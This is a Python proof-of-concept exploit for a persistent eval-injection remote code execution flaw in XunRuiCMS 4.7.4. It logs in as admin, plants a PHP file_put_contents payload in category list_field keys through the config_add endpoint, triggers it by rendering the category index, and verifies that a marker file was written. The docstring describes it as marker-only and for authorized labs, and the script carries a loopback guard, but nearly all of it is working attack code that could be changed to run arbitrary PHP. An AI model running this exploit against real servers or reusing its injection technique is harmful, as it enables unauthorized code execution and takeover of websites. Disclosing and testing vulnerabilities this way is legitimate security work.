#!/usr/bin/env python3
"""XunRuiCMS 4.7.4: persistent eval injection RCE via category list_field keys - PoC.

Marker-level only: the payload writes a small marker file under the web root and
the script verifies it over HTTP. No webshell, no command execution, nothing
weaponized. config_add overwrites the module category configuration, so run this
only against a disposable authorized lab instance; afterwards delete
cache/config/category.php and the marker file to restore the install.

The login form expects the password as md5(password) (the admin UI hashes it in
JS first); this script does the same so the plaintext password is never sent.

Standard library only. Use only against an authorized lab instance.
"""
import argparse
import hashlib
import http.cookiejar
import json
import sys
import urllib.parse
import urllib.request


def md5(s: str) -> str:
    return hashlib.md5(s.encode()).hexdigest()


class Client:
    def __init__(self, base: str, timeout: int = 15):
        self.base = base.rstrip('/')
        self.timeout = timeout
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar))

    def request(self, method: str, path: str, data: dict | None = None):
        url = self.base + path
        body = urllib.parse.urlencode(data).encode() if data is not None else None
        req = urllib.request.Request(url, data=body, method=method)
        if body is not None:
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        with self.opener.open(req, timeout=self.timeout) as resp:
            raw = resp.read().decode('utf-8', 'replace')
            return resp.status, dict(resp.headers), raw, url, (data or {})


def main():
    p = argparse.ArgumentParser()
    p.add_argument('base', help='Base URL, e.g. http://127.0.0.1:8080')
    p.add_argument('--username', required=True, help='admin username')
    p.add_argument('--password', required=True, help='admin plaintext password (sent as md5)')
    p.add_argument('--marker-file', default='v1_ok.txt', help='marker file written into the web root')
    p.add_argument('--marker-text', default='V1_RCE_OK', help='marker text prefix')
    p.add_argument('--marker-key', default='v1', help='marker key appended as md5(key)')
    p.add_argument('--i-am-authorized', action='store_true',
                   help='required for non-loopback targets')
    p.add_argument('--out', default='-', help='write the transcript here (- = stdout)')
    args = p.parse_args()

    host = urllib.parse.urlparse(args.base).hostname or ''
    if host not in ('127.0.0.1', 'localhost', '::1') and not args.i_am_authorized:
        raise SystemExit('non-loopback target: pass --i-am-authorized to confirm '
                         'you have authorization for this host')

    marker_content = '{}_{}'.format(args.marker_text, md5(args.marker_key))
    key = 'file_put_contents("{}", "{}_".md5("{}"))'.format(
        args.marker_file, args.marker_text, args.marker_key)

    transcript = []

    def note(label, status, headers, raw, url, sent=None):
        entry = {'step': label, 'method': 'POST' if sent else 'GET',
                 'url': url, 'status': status}
        if sent:
            entry['sent'] = sent
        entry['body_preview'] = raw[:400]
        transcript.append(entry)
        return raw

    c = Client(args.base)

    # step 1: admin login (password sent as md5, matching the admin UI behavior)
    status, headers, raw, url, sent = c.request(
        'POST', '/admin.php?c=login&m=index',
        {'data[username]': args.username, 'data[password]': md5(args.password)})
    note('login', status, headers, raw, url, sent)
    try:
        login = json.loads(raw)
    except ValueError:
        raise SystemExit('login: non-JSON response (captcha enabled? wrong endpoint?) ' + raw[:200])
    if login.get('code') != 1:
        raise SystemExit('login failed: ' + json.dumps(login, ensure_ascii=False))

    # step 2: write the eval payload as list_field array keys (no CSRF token needed)
    status, headers, raw, url, sent = c.request(
        'POST', '/admin.php?c=category&m=config_add', {
            'data[list_field][${' + key + '}][use]': '1',
            'data[list_field][${' + key + '}][name]': 'V1',
        })
    note('config_add', status, headers, raw, url, sent)
    if '"code":1' not in raw.replace(' ', ''):
        raise SystemExit('config_add failed: ' + raw[:300])

    # step 3: trigger - rendering the category list evals the injected key
    status, headers, raw, url, sent = c.request('GET', '/admin.php?c=category&m=index')
    note('trigger (category index)', status, headers, raw, url)

    # step 4: verify the marker file over HTTP
    status, headers, raw, url, sent = c.request('GET', '/' + args.marker_file)
    note('verify marker file', status, headers, raw, url)
    got = raw.strip()
    verified = (status == 200 and got == marker_content)

    result = {
        'payload_key': '${' + key + '}',
        'expected_marker': marker_content,
        'marker_http_status': status,
        'marker_content': got[:200],
        'rce_verified': verified,
        'transcript': transcript,
    }
    out = json.dumps(result, indent=2, ensure_ascii=False)
    if args.out == '-':
        print(out)
    else:
        with open(args.out, 'w', encoding='utf-8') as f:
            f.write(out + '\n')
        print('transcript written to', args.out)
    print('RESULT:', 'RCE_VERIFIED' if verified else 'NOT_VERIFIED',
          file=sys.stderr)
    sys.exit(0 if verified else 1)


if __name__ == '__main__':
    main()
